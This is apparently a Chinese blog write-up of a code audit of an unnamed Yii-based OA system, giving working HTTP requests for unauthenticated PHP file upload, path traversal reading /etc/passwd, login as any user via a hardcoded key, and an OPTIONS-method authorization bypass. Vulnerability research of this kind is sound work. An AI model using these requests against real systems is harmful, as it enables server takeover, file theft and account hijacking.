前言
==

本篇文章首发在先知社区 作者Zjacky(本人) 先知社区名称: `Zjacky` 转载原文链接为https://xz.aliyun.com/t/13888

代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的是一套`Yii`​框架开发的OA系统，算是小0day吧，当然不是自己独自审计，感谢几个审计爹带我@up@冬夏 由于尚未公开，大部分都是厚码，凑合着康康

‍

开发文档
====

(有的时候一键搭建的时候是会存在一些开发文档的，这些入口文件，路由拼接 ， 都需要去查看这些开发文档)

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2845cfffc5c58a17079802ec0c4972410c739180.png)​​

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-61a3aaed6fc4c266f939963f7406b0b7c2ccae69.png)​​

可以发现他其实是以`system`​作为根目录来进行模块化管理，所以我们可以对照着开发文档以及登录的接口来对比看这个MVC框架是如何对应的,当然了，其实我们可以找到他的`Yii`​入口文件为`/web/index.php`​

这个`index.php`​做了几个定义，首先是设定了我们用户登录的地址为`/oa/main/login`​ 然后应用的入口为`oa`​

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-c10ef892dcd83bb2c843fc53a036fe8e689e64c5.png)​

抓到登录的接口

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-37abf26632e5a629c7d44877d4becd675e1d36ed.png)​​

可以发现是`/oa/main/login`​这样的接口(由于他有csrf-token所以重放包会302)，所以直接看报错回显就行

那我们再来仔细看看`Yii`​的路由分析(具体详细的原理代码跟踪在参考链接中可参考)

其实框架的URI分析还是有点复杂的(看个大概就行)，这个时候我们来找找这个`/oa/main/login`​是怎么对应的

在`\system\modules\oa\controllers\MainController.php`​ 找到以下代码

‍

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2150e137b3189d1221617836fd7ccf354d33ef83.png)​

‍

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-faa74a0faf9393183f02d86c3eca29db09b55f3e.png)​

继续跟进`\system\modules\user\components\LoginAction::className()`​

搜索一下`账号不存在`​其实就可以找到确实是这么个对应法了

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-e028e27fb9a6d6c229c755c8d36e6e5e5fa95f87.png)​

那么这个路由总结一下

`/oa/main/login`​ -&gt; 模块名(models)/控制器(controller)/操作(action)

‍

当然了 ，在后续的审计过程中发现其实也给出了相对应的路由访问形式写在了代码中的

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-839cdec39ae8cb79cc96d7ca1e871f7efc2290ef.png)​

会在`$dependIgnoreValueList`​ 变量中将一些路由访问形式写出来(前提是这个`$layout`​是一个@开头的东东)

‍

审计
==

‍

上传1
---

‍

全局搜了下`move_uploaded_file`​ 然后找了两个在`modules`​下的文件进行审计

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-deb6037fee58ed2e213060e7760a15fa7039ba7b.png)​​

‍

当进去看上传逻辑的时候发现有一个很抽象的点，开发把扩展后缀的限制注释掉了，所以导致了后面写`$config`​的时候会没有效果

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-b2fa6fd37211e1b21eb041f0460674163b1bfad5.png)​​

那么很有可能就会存在任意文件上传了，然后下面的操作就是跟进了下`saveAs`​方法发现也并没有什么过滤

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-36bddd08729b14f492ac5c607a9e12ab9781d008.png)​

‍

那么接下来就是如何去找到一个控制器是调用了这个类的方法`\system\modules\main\extend\SaveUpload.php#saveFile`​的

emmm 全局搜索了下发现并没有(我裂开，可是明显确实是有问题的啊)于是我不死心就在此全局搜索了下`SaveUpload`​这个关键词

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-f7c90ac5466066105589071eb2140abc8e22c20d.png)​​

我突然看到一个点，他通过命名空间来进行调用方法的，所以说只要出现了`SaveUpload::saveFile(`​ (并且在modules下)就会存在任意文件上传了

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-eeb09c3b06e57bee42681b1f6b6dcc5439635c26.png)​​

那么在上述已经讲述过了`Yii`​框架的路由分析，所以这个时候只要去找到谁去调用了这些路径的方法即可 ，比如全局搜索

- `\system\modules\main\extend\Upload.php`​
- `\system\modules\party\extend\Upload.php`​

‍

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-70693efde62b2bf65ee3c185035fa909b46db437.png)​​

但是上述两个最为简单的发现并没有成功(也不是权限问题感觉)

‍

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-8a1703e637e04565e7fb36560d68cb96d9ffac3f.png)​​

这里属实太多任意文件上传了(MD要是CNVD估计能刷七八张了吧可惜bushi)

其实大部分都不能成功的(为啥？因为鉴权了，但是以下是存在未授权访问的)

- `contacts/default/upload`​
- `salary/record/upload`​
- `knowledge/default/upload`​​​​​

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-1f91b7aeb31a6267a3123f50bab471a40cdff061.png)​​

而鉴权的代码是这样子的

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-69b9827fbc3812d3c8fbc985bea6793c877c8a26.png)​

最终报文

```xml
POST /index.php/salary/record/upload HTTP/1.1
Host: xxx
Content-Length: 196
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQayVsySyhSwgpmLk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/upload/upload.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryQayVsySyhSwgpmLk
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png

&lt;?php phpinfo();?&gt;
------WebKitFormBoundaryQayVsySyhSwgpmLk--
```

​​

上传2 + 任意文件下载
------------

一样是全局搜索函数​`move_uploaded_file`​

找到`\web\static\lib\weboffice\js\OfficeServer.php`​这个文件(因为是在`static`​目录下于是就尝试访问下(因为很有可能是静态的资源可以直接访问))

所以我们直接访问下发现返回200证明文件存在

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2ac95e16d901403e18d1a3d20f9d494abef5ee97.png)​​

接着审计代码逻辑

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-74480b61d4d5cb1e3c4dafb8e1315cef6ce490a7.png)​

代码很短，可以很轻松读懂，获取一个json值，然后获取他的`OPTION`​值满足他的switch值就可以进入到上传的逻辑，可以进行文件下载，也可以进行上传

经过测试，可控

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2776476cf93d53e6f80e2de61696255387c0cbcf.png)​

‍

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-ab4fc5f75e574c015240d4465ab3f5d3fed0d13d.png)​

接着就是构造下载包和上传包了

‍

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a0bd47fe06071064450ed17f8d4d1c6d0ff6aa6c.png)​

```xml
GET /static/lib/weboffice/js/OfficeServer.php?FormData={%22OPTION%22:%22LOADFILE%22,%22FILEPATH%22:%22/../../../../../../../../../../../etc/passwd%22} HTTP/1.1
Host: xxxx
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://oa1.shuidinet.com/index.php/oa/main/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

‍

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-ae2051a3212f42e9134b19d3229e752caddc87f7.png)​​

```xml
POST /static/lib/weboffice/js/OfficeServer.php?FormData={%22OPTION%22:%22SAVEFILE%22,"FILEPATH":"/222.php"} HTTP/1.1
Host: xxxx
Content-Length: 202
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQayVsySyhSwgpmLk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/upload/upload.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryQayVsySyhSwgpmLk
Content-Disposition: form-data; name="FileData"; filename="222.php"
Content-Type: image/png

&lt;?php phpinfo();?&gt;
------WebKitFormBoundaryQayVsySyhSwgpmLk--

```

‍

任意用户登录
------

在上传的篇章中其实是可以知道架构的，所以看了下`oa`​下的文件，发现`Auth`​的鉴权控制器查看后发现存在硬编码

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-8dc2614c8c8d6596789a2e9bb66e063bd074d335.png)​

‍

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-cc8a1f82dc656d48347d056971f97f4e723aaef8.png)​​

当然也给了注释

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-564e970b423cddc7f44736f055358801117b2707.png)​​

那么构造逻辑即可成功登录，传入`user`​ base64加密的内容并且跟key进行拼接后再md5加密传为`token`​， 两者相等即可登录

前提是user是存在的(跑一下就知道是zhangsan存在)

```xml
GET /oa/auth/withub?user=emhhbmdzYW4=&amp;token=b336aa3ea64e703583bb7cbe6d924269 HTTP/1.1
Host: xxxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

# user zhangsan
```

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-bd4ff8b7e5ae831e168ba9c3723b47c20266416c.png)​​

直接跳转即可登录了​​

‍

权限绕过
----

这个地方我只能直接封神@up哥 ，我第一次审，没看出来，第二次审，也没看出来，告诉我是权限绕过，我也没审计出来(建议重开)

找到这个文件 `api/modules/v1/controllers/UserController.php`​

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-61ab61e3e3d32449c2935bbc822d25d5f1cce33f.png)​

我的内心想法和审计思路： 在众多目录中当我看完开发文档中的`system`​根目录我去瞄一眼`api`​目录是一件很符合逻辑的事情，细看这里有一个这么写的代码

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-5cf31bddd637555d7afabce81427b7735d04a0ed.png)​

```php
    // 不需要认证的方法，用下划线形式，如get_info
    public $notAuthAction = ['auth','verify-url'];
```

又因为他的方法名为

```php
actionVerifyUrl()
actionGetInfo() 
actionAuth()
```

那么通过挖洞大牛子的大脑一眼丁真所以直接传参(所以配合上述来看，`actionAuth`​ 和 `VerifyUrl`​ 不需要鉴权 )

那也就是说`GetInfo`​是需要鉴权的，我们传参进去试试

这里就有个疑问了？如何传参？(这就需要去熟悉一下`Yii`​的框架了) 所以从他的`/web/`​下的入口文件来找到定义`/api`​的入口 -&gt; `oa-api.php`​

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-e816e0971b15801f0ad74e61b920b23ce9f2c172.png)​

那么我尝试了下以下传参后发现返回404

```php
/oa-api.php/v1/user/getinfo?id=1
```

于是重新回过头来查看这串代码

```php
public $notAuthAction = ['auth','verify-url'];
```

发现可能中间会存在`-`​来进行分割(这是要有多细心)

所以最终通过以下传参发现成功传入但回显为401证明存在鉴权

```php
/oa-api.php/v1/user/get-info?id=1
```

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-5c9e8f3d07edfdd6197bf14b004161695946ea2a.png)​​

‍

这里因为他继承了`BaseApiController`​ 所以跟进父类查看

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-70e2d34fe1c5513e2444616f9f153c1a7068a5c2.png)​

tips: 这里的`behaviors`​方法应该是会先走的(具体为啥可能因为是`yii`​框架的原因吧 )

所以下边有一个`||`​进行了一个`if`​判断 (又是猜猜猜了)这里判断登录是否请求方式为`OPTIONS`​ 或者 是不鉴权的接口(`notAuthAction`​)就进入下面逻辑，那就猜测通过`OPTIONS`​后就不鉴权了接口于是构造报文

​![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-74480b61d4d5cb1e3c4dafb8e1315cef6ce490a7.png)​​​

‍

参考链接
====

- <https://blog.csdn.net/yang1018679/article/details/105929162> (Yii路由分析一)
- <https://blog.csdn.net/yang1018679/article/details/105935326> (Yii路由分析二)

‍

总结
==

- 一定要细心，多仔细去猜测开发的思路
- 多猜测一些奇怪的写法(以黑盒的逻辑来看白盒)
- 要有经验(本次`Yii`​确实是第一次审 比较吃力了)

这里小插曲，我非常虚心的去问了一下审计的大牛子，原来发现代码审计如此简单啊！

![image](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2776476cf93d53e6f80e2de61696255387c0cbcf.png)​​

‍